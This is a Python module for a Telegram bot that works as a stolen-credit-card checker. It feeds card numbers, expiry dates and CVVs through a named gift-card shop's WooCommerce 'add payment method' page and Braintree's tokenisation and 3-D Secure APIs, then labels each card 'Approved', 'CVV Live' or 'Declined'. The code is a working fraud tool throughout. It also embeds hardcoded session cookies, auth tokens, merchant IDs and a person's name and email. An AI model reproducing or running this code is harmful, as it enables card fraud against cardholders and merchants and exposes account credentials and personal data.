from aiogram import Bot, Dispatcher, types
import aiohttp
import datetime
import string
import random
import json
from config import auth_chats, API_TOKEN, can_use_b3
from faker import Faker
import re
import ssl
import base64
from bs4 import BeautifulSoup
import asyncio

# from config import API_TOKEN
# bot = Bot(token=API_TOKEN)
message: types.Message

async def handle_aum_command(chat_id: int, user_id: int, cc: str, mes: str, ano: str, cvv: str):
    start_time = datetime.datetime.now()

    if chat_id in auth_chats['private'] or chat_id in auth_chats['group']:
        if not await can_use_b3(chat_id, user_id):
            return "Please wait 30 seconds before using /ad again.", None

        # التحقق من المعلومات
        if not all([cc, mes, ano, cvv]):
            return "Missing required information.", None

        if len(cc) == 16 and len(cvv) == 3 and mes.isdigit() and ano.isdigit() and len(ano) == 4:
            email = generate_random_email(domain='gmail.com')
            # إرسال البطاقة للفحص
            response_message= await req1(chat_id, user_id, cc, mes, ano, cvv, start_time)
            if response_message:
                return response_message
            else:
                return f'Error: {response_message}'

def generate_random_email(domain='example.com', length=10):
    characters = string.ascii_letters + string.digits
    random_part = ''.join(random.choice(characters) for i in range(length))
    return f"{random_part}@{domain}"

async def req1(chat_id, user_id, cc, mes, ano, cvv, start_time):    
    url = "https://www.mygiftcardsupply.com/my-account/add-payment-method/"  
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'cookie': '_ga=GA1.1.1109560845.1711964052; _vwo_uuid_v2=DB5176FC49571B01819F21FDFECC17F1E|cb2cf2e63ff62f79624f17d98f57df05; _gcl_au=1.1.755492581.1711964052; wordpress_logged_in_5fc40ca1da6d19ddf665ff9abed42034=mohammad.ali-2669%7C1714563091%7Cg8Vrq175zrgGWBm7g5LxAqpn0BWiFGKe7ivrFxcp3TD%7Ca6b05dbe53f3e27cf455e8627b897e18e3da9ae4a1ba07af605792effb55f6a9; wfwaf-authcookie-5a925ba9a0153c4e2b3e3f941c1e1e13=1051835%7Cother%7Cread%7Cf26c7118259863c6f1882ab5c387c04d3583fe204ad40ceac73958cd56418fd0; woocommerce_items_in_cart=1; woocommerce_cart_hash=39fe927fc43e830d073f1bba971b09f0; wp_woocommerce_session_5fc40ca1da6d19ddf665ff9abed42034=1051835%7C%7C1712766787%7C%7C1712763187%7C%7Ce1eec95a020caf0a8a84af0e77d9bb6c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-08%2016%3A34%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-08%2016%3A34%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F123.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F; __kla_id=eyJjaWQiOiJNMkZoWVdRMFpUTXRNalU0WWkwMFltTXhMV0kzTVRndE1qUXhOMkkzWVdFNFlqWmsiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTE2MTM3NzAsInZhbHVlIjoiaHR0cHM6Ly93d3cubXlnaWZ0Y2FyZHN1cHBseS5jb20vY2hlY2tvdXQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3Lm15Z2lmdGNhcmRzdXBwbHkuY29tLyNjYXJ0LWRyYXdlciJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMjU5NDA3MSwidmFsdWUiOiIiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cubXlnaWZ0Y2FyZHN1cHBseS5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6IjJ6eExmdUFkSmt0RUZvMEJzcHhFaHd6YWpwclQ1b25SbWdoTmt5eEFBRlkuZUJINkJrIn0=; _clck=wr605x%7C2%7Cfkr%7C0%7C1552; cf_clearance=62SbwDeasSvZtHEpDm.JnCBiQOy_.FRtX1GX0wIfsho-1712593993-1.0.1.1-foJnTTYLXN9E06bqNTcsgl3E_vMsCfQwI8gQteQSwfJQGrUyNj2UWgoaK27k1uvJWqM7HfxGQmf91OLtvLAT6g; _clsk=mocnmz%7C1712594072951%7C1%7C1%7Cn.clarity.ms%2Fcollect; _ga_TP863WT74C=GS1.1.1712594070.4.0.1712594157.60.0.0',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"123.0.6312.106"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.106", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.106"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Telegram / @MRootSu) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }
    
    async with aiohttp.ClientSession() as session:

        async with session.get(url, headers=headers) as response:
            response_text = await response.text()
            token_pattern = re.compile(r'var wc_braintree_client_token = \["(.*?)"\];')
            match = token_pattern.search(response_text)
            if match:
                encoded_token = match.group(1)
                decoded_token = base64.b64decode(encoded_token).decode('utf-8')
                fingerprint_pattern = re.compile(r'"authorizationFingerprint":"(.*?)"')
                fingerprint_match = fingerprint_pattern.search(decoded_token)
                if fingerprint_match:
                    authorization_fingerprint = fingerprint_match.group(1)

            nonce_pattern = re.compile(r'<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="(.*?)"')    
            nonce_match = nonce_pattern.search(response_text)
            if nonce_match:
                nonce_2 = nonce_match.group(1)
                return await req2(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, nonce_2)
            else:
                return response_text
            

async def req2(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, nonce_2):
    headers = {
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {authorization_fingerprint}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '7f2348c5-f043-4dc5-85b3-f42a97a3e61a',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10080',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
        
    async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data) as response:
        response_data = await response.json() 
        if 'data' in response_data and 'tokenizeCreditCard' in response_data['data'] and 'token' in response_data['data']['tokenizeCreditCard']:
            token = response_data["data"]["tokenizeCreditCard"]["token"]
            # print("Token:", token)
            return await req3(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, token, nonce_2)
        else:
            return response_data
async def req3(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, token, nonce_2): 
    headers = {
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.mygiftcardsupply.com',
        'pragma': 'no-cache',
        'referer': 'https://www.mygiftcardsupply.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    payload = {
        'amount': '0.00',
        'additionalInfo': {
            'billingLine1': '',
            'billingLine2': '',
            'billingCity': '',
            'billingState': '',
            'billingPostalCode': '',
            'billingCountryCode': 'JO',
            'billingPhoneNumber': '',
            'billingGivenName': 'mohammad',
            'billingSurname': 'ali',
            'email': 'm7madas.24@gmail.com',
        },
        'challengeRequested': True,
        "bin": cc[:6],
        'dfReferenceId': '0_f781c479-db08-400c-925b-e9d9960b1f06',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.98.0',
            'cardinalDeviceDataCollectionTimeElapsed': 627,
            'issuerDeviceDataCollectionTimeElapsed': 591,
            'issuerDeviceDataCollectionResult': True,
        },
        "authorizationFingerprint": authorization_fingerprint,
        'braintreeLibraryVersion': 'braintree/web/3.98.0',
        '_meta': {
            'merchantAppId': 'www.mygiftcardsupply.com',
            'platform': 'web',
            'sdkVersion': '3.98.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '7f2348c5-f043-4dc5-85b3-f42a97a3e61a',
        },
    }
    
    async with session.post(f'https://api.braintreegateway.com/merchants/x2662rnck9dfwwhg/client_api/v1/payment_methods/{token}/three_d_secure/lookup', json=payload, headers=headers) as response:
        response_data = await response.text()  # استخدم .text() للحصول على النص الخام
        try:
            response_json = await response.json()  # حاول تحليل النص إلى JSON
        except Exception as e:
            response_json = None

        if response.status == 201 and response_json:
            # استخدام response_json كما هو موضح سابقًا
            
            term_url = response_json["lookup"]["termUrl"]
            match = re.search(r'authorization_fingerprint=([^&]+)', term_url)
            token_2 = match.group(1) if match else None
            nonce = response_json["paymentMethod"]["nonce"]
            status = response_json["paymentMethod"]["threeDSecureInfo"]["status"]
            cardType = response_json["paymentMethod"]["details"]["cardType"]
            issuingBank = response_json["paymentMethod"]["binData"]["issuingBank"]
            countryOfIssuance = response_json["paymentMethod"]["binData"]["countryOfIssuance"]
            bin = response_json["paymentMethod"]["details"]["bin"]
            message_text = f"Nonce: {nonce}\nStatus: {status}\nCard Type: {cardType}\nIssuing Bank: {issuingBank}\nCountry of Issuance: {countryOfIssuance}\nBIN: {bin}\ey: {token_2}"
            # print(response.text)
            return await req4(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, token, nonce, token_2, nonce_2, status)
            
        else:
            return f"Failed to get 3DS lookup: {response_data}"
        
async def req4(chat_id, user_id, cc, mes, ano, cvv, start_time, session, authorization_fingerprint, token, nonce, token_2, nonce_2, status):
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'cookie': '_ga=GA1.1.1109560845.1711964052; _vwo_uuid_v2=DB5176FC49571B01819F21FDFECC17F1E|cb2cf2e63ff62f79624f17d98f57df05; _gcl_au=1.1.755492581.1711964052; wordpress_logged_in_5fc40ca1da6d19ddf665ff9abed42034=mohammad.ali-2669%7C1714563091%7Cg8Vrq175zrgGWBm7g5LxAqpn0BWiFGKe7ivrFxcp3TD%7Ca6b05dbe53f3e27cf455e8627b897e18e3da9ae4a1ba07af605792effb55f6a9; wfwaf-authcookie-5a925ba9a0153c4e2b3e3f941c1e1e13=1051835%7Cother%7Cread%7Cf26c7118259863c6f1882ab5c387c04d3583fe204ad40ceac73958cd56418fd0; woocommerce_items_in_cart=1; woocommerce_cart_hash=39fe927fc43e830d073f1bba971b09f0; wp_woocommerce_session_5fc40ca1da6d19ddf665ff9abed42034=1051835%7C%7C1712766787%7C%7C1712763187%7C%7Ce1eec95a020caf0a8a84af0e77d9bb6c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-08%2016%3A34%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-08%2016%3A34%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F123.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.mygiftcardsupply.com%2Fmy-account%2Fadd-payment-method%2F; __kla_id=eyJjaWQiOiJNMkZoWVdRMFpUTXRNalU0WWkwMFltTXhMV0kzTVRndE1qUXhOMkkzWVdFNFlqWmsiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTE2MTM3NzAsInZhbHVlIjoiaHR0cHM6Ly93d3cubXlnaWZ0Y2FyZHN1cHBseS5jb20vY2hlY2tvdXQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3Lm15Z2lmdGNhcmRzdXBwbHkuY29tLyNjYXJ0LWRyYXdlciJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMjU5NDA3MSwidmFsdWUiOiIiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cubXlnaWZ0Y2FyZHN1cHBseS5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6IjJ6eExmdUFkSmt0RUZvMEJzcHhFaHd6YWpwclQ1b25SbWdoTmt5eEFBRlkuZUJINkJrIn0=; _clck=wr605x%7C2%7Cfkr%7C0%7C1552; cf_clearance=62SbwDeasSvZtHEpDm.JnCBiQOy_.FRtX1GX0wIfsho-1712593993-1.0.1.1-foJnTTYLXN9E06bqNTcsgl3E_vMsCfQwI8gQteQSwfJQGrUyNj2UWgoaK27k1uvJWqM7HfxGQmf91OLtvLAT6g; _clsk=mocnmz%7C1712594072951%7C1%7C1%7Cn.clarity.ms%2Fcollect; _ga_TP863WT74C=GS1.1.1712594070.4.0.1712594157.60.0.0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.mygiftcardsupply.com',
        'pragma': 'no-cache',
        'referer': 'https://www.mygiftcardsupply.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"123.0.6312.106"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.106", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.106"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Telegram / @MRootSu) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}

    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': nonce,
        'braintree_cc_device_data': '{"device_session_id":"d251c6f469e4b9468316de710f3c203b","fraud_merchant_id":null,"correlation_id":"ac4f34d59509f984cac31b9c725386ad"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/x2662rnck9dfwwhg/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/x2662rnck9dfwwhg"}},"merchantId":"x2662rnck9dfwwhg","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"applePayWeb":{{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"x2662rnck9dfwwhg","supportedNetworks":["visa","mastercard","discover"]}},"kount":{{"kountMerchantId":null}},"challenges":["cvv","postal_code"],"creditCards":{{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","UnionPay"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{token_2}"}},"paypalEnabled":true,"paypal":{{"displayName":"MyGiftCardSupply","clientId":"AZxrmxl3paSeJdY0mdSr70ABNGqrQCVyRfDr6_Ie87CgRPzhw4qDmXkfqGlprOI0fGE7y8QSce2-KErv","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"mygiftcardsupply_instant","payeeEmail":null,"currencyIsoCode":"USD"}}}}',
        'woocommerce-add-payment-method-nonce': nonce_2,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    
}            
    
    async def fetch_bin_details(session, cc):
        url = "https://api.voidex.dev/api/bin"
        params = {"bin": cc[:6]}
        async with session.get(url, params=params) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                print("Failed to retrieve bin details")
                return None

    
    bin_details = await fetch_bin_details(session, cc[:6])
    if bin_details:
        # print(bin_details)
        country_name = bin_details.get('country_name', 'Unknown')
        country_flag = bin_details.get('country_flag', 'Unknown')
        bank = bin_details.get('bank', 'Unknown')
        level = bin_details.get('level', 'Unknown')
        type_ = bin_details.get('type', 'Unknown')
        brand = bin_details.get('brand', 'Unknown')

    
    async with session.post('https://www.mygiftcardsupply.com/my-account/add-payment-method/', headers=headers, data=data) as response:
        html_response = await response.text()
        # print(html_content)
        end_time = datetime.datetime.now()  # تسجيل وقت الانتهاء
        duration = end_time - start_time  

        
        soup = BeautifulSoup(html_response, 'html.parser')

        messages_container = soup.find('div', class_='woocommerce-notices-wrapper')
        messages = messages_container.find_all(['li', 'div']) if messages_container else []
        general_error_pattern = r"There was an error saving your payment method. Reason: (.*?)\s*</li>"
        success_messages = [
            "Payment method successfully added.",
            "Duplicate card exists in the vault."
        ]

        error_messages = [
            "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds."
        ]

        found_message = ""
        for message_ in messages:
            text = str(message_)
            general_error_match = re.search(general_error_pattern, text, re.DOTALL)
            if general_error_match:
                found_message ={general_error_match.group(1)}
                break

            text_only = message_.get_text(strip=True)
            if any(success_message in text_only for success_message in success_messages):
                found_message = text_only
                break
            elif any(error_message in text_only for error_message in error_messages):
                found_message = text_only
                break
        if found_message:
            print(found_message)
        else:
            return response_message

            
    found_message_text = ', '.join(found_message) if isinstance(found_message, set) else found_message
    found_message_text = found_message_text.replace("{", "").replace("}", "").replace("'", "")

    if 'Payment method successfully added' in found_message_text or 'Duplicate card exists in the vault' in found_message_text:
        response_status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif 'Insufficient Funds' in found_message_text or 'Limit Exceeded' in found_message_text:
        response_status = "𝐂𝐕𝐕 𝐋𝐢𝐯𝐞 ✅"
    elif 'Card Issuer Declined CVV' in found_message_text:
        response_status = "𝐂𝐂𝐍 ♻️"
    elif 'Please wait for 20 seconds' in found_message_text:
        response_status = "𝐑𝐞𝐭𝐫𝐲 ⚠️"    
    else:
        response_status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    response_message = (
        f"{response_status}\n\n"
        f"𝐂𝐚𝐫𝐝 ⇾ <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {found_message_text}\n\n"
        # f"𝐋𝐨𝐨𝐤𝐮𝐩 ⇾ {status}\n\n"
        f"𝐈𝐧𝐟𝐨 ⇾ {type_} - {level} - {brand}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {country_flag}\n\n"
        f"𝐓𝐨𝐨𝐤 ⇾ {round(duration.total_seconds(), 2)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
        
    )
    print(found_message_text)
    # print(response_message)
    return response_message